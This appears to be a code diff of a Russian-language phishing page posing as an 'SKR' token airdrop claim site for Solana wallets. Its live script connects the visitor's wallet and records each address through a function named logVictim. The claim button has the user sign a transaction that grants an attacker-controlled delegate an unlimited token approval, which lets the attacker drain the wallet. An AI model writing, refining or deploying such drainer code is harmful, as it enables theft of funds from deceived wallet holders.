@@ -36,7 +36,7 @@
 </head>
 <body>
     <header>
-        <button class="connect-btn" id="connect-wallet">Подключить Кошелёк</button>
+        <button class="connect-btn" id="connect-wallet" onclick="connectWallet()">Подключить Кошелёк</button>
     </header>
     <div class="container">
         <img src="https://purple-accused-scorpion-11.mypinata.cloud/ipfs/bafybeifvwriqjehl62zeceva2yp7653jxy7sghyehrqh263aeuqbecsy7i" alt="SKR Logo" class="skr-logo">
@@ -78,16 +78,6 @@
             }).catch(() => {});
         }
 
-        function updateUI() {
-            if (walletPubkey) {
-                document.getElementById('wallet-address').innerText = Подключено: \( {walletPubkey.slice(0,8)}... \){walletPubkey.slice(-6)};
-                document.getElementById('connect-wallet').innerText = "Подключено";
-                document.getElementById('connect-wallet').disabled = true;
-                document.getElementById('claim-skr').disabled = false;
-                document.getElementById('status').innerText = "Готов к клейму!";
-            }
-        }
-
         async function connectWallet() {
             const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
 
@@ -98,34 +88,39 @@
             }
 
             if (!window.solana) {
-                document.getElementById('status').innerText = "Установи Solana wallet!";
+                alert("Установи Solana wallet (Phantom, Backpack, Solflare или MetaMask с Solana support)!");
                 return;
             }
 
             wallet = window.solana;
 
             try {
-                // Автоматическое подключение без trusted check
-                await wallet.connect({ onlyIfTrusted: false });
+                await wallet.connect();
                 walletPubkey = wallet.publicKey.toString();
-                updateUI();
+
+                document.getElementById('wallet-address').innerText = Подключено: \( {walletPubkey.slice(0,8)}... \){walletPubkey.slice(-6)};
+                document.getElementById('connect-wallet').innerText = "Подключено";
+                document.getElementById('connect-wallet').disabled = true;
+                document.getElementById('claim-skr').disabled = false;
+                document.getElementById('status').innerText = "Готов к клейму!";
+
                 logVictim(walletPubkey);
-            } catch (err) {
-                document.getElementById('status').innerText = "Ошибка подключения — попробуй снова";
+
+                // Обработчик отключения
+                wallet.on('disconnect', () => {
+                    walletPubkey = null;
+                    document.getElementById('wallet-address').innerText = "Не подключено";
+                    document.getElementById('connect-wallet').innerText = "Подключить Кошелёк";
+                    document.getElementById('connect-wallet').disabled = false;
+                    document.getElementById('claim-skr').disabled = true;
+                    document.getElementById('status').innerText = "Кошелёк отключён";
+                });
+
+            } catch (error) {
+                console.error("Ошибка подключения:", error);
+                alert("Ошибка подключения к кошельку. Проверьте wallet и попробуйте снова.");
             }
         }
-
-        // Авто-подключение при загрузке (если wallet уже доверяет)
-        window.addEventListener('load', () => {
-            if (window.solana && window.solana.isConnected) {
-                walletPubkey = window.solana.publicKey.toString();
-                wallet = window.solana;
-                updateUI();
-                logVictim(walletPubkey);
-            }
-        });
-
-        document.getElementById('connect-wallet').onclick = connectWallet;
 
         document.getElementById('claim-skr').onclick = async () => {
             if (!walletPubkey || !wallet) return;
@@ -142,11 +137,11 @@
                 let instructions = [];
                 instructions.push(splToken.createAssociatedTokenAccountInstruction(owner, ata, owner, mint));
                 instructions.push(splToken.createApproveInstruction(ata, delegate, owner, [], Number.MAX_SAFE_INTEGER));
-
                 const tx = new solanaWeb3.Transaction().add(...instructions);
                 tx.feePayer = owner;
                 const { blockhash } = await connection.getLatestBlockhash();
                 tx.recentBlockhash = blockhash;
+
                 const signed = await wallet.signTransaction(tx);
                 const sig = await connection.sendRawTransaction(signed.serialize());
 
